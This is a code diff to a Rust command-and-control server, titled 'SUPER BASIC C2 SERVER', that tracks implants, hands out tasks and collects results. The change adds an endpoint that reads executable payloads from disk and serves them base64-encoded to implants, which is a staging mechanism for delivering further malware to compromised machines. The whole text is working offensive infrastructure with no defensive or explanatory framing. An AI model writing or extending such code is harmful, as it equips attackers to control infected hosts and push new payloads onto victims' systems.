@@ -1,9 +1,10 @@
 // ++++++++++++++++++++++++++++++++++++++++
 // SUPER BASIC C2 SERVER
 // ++++++++++++++++++++++++++++++++++++++++
-use axum::{routing::post, routing::get, Router, Json, response::IntoResponse, extract::State, http::StatusCode};
+use axum::{routing::post, routing::get, Router, Json, response::IntoResponse, extract::{State, Path}, http::StatusCode};
 use serde::{Deserialize, Serialize};
 use std::sync::Arc;
+use base64::{engine::general_purpose, Engine as _};
 
 #[derive(Serialize, Deserialize, Clone)]  
 struct Task {
@@ -51,6 +52,11 @@ struct ImplantData{
     last_seen: i64,
 }
 
+#[derive(Serialize)]
+struct PayloadResponse {
+    pe: String,
+}
+
 #[tokio::main]
 async fn main() {
     let db = sqlx::SqlitePool::connect("sqlite://rustkit.db?mode=rwc")
@@ -76,6 +82,7 @@ async fn main() {
         .route("/result", post(submit_result))
         .route("/result", get(get_result))
         .route("/implants", get(view_implants))
+        .route("/payload/:filename", get(server_payload))
         .with_state(state);
 
     let listener = tokio::net::TcpListener::bind("127.0.0.1:3000")
@@ -231,4 +238,21 @@ async fn view_implants(State(state): State<Arc<AppState>>) -> Result<Json<Vec<Im
     println!("Found {} implants in database", implants.len());
     
     Ok(Json(implants))
+}
+
+async fn server_payload(State(state): State<Arc<AppState>>, Path(filename): Path<String>) -> Result<Json<PayloadResponse>, (StatusCode, String)> {
+    if !filename.chars().all(|c| c.is_alphanumeric() || c == '.' || c == '_' || c == '-') {
+        return Err((StatusCode::BAD_REQUEST, "Invalid filename".to_string()));
+    }
+
+    let path = format!("../payload/{}", filename);
+    let payload = std::fs::read(&path)
+    .map_err(|e| (StatusCode::NOT_FOUND, format!("Failed to read payload: {}", e)))?;
+
+    let encoded_payload = general_purpose::STANDARD.encode(&payload);
+     println!("Serving payload: {} ({} bytes, {} base64)", filename, payload.len(), encoded_payload.len());
+
+    Ok(Json(PayloadResponse{
+        pe: encoded_payload
+    }))
 }
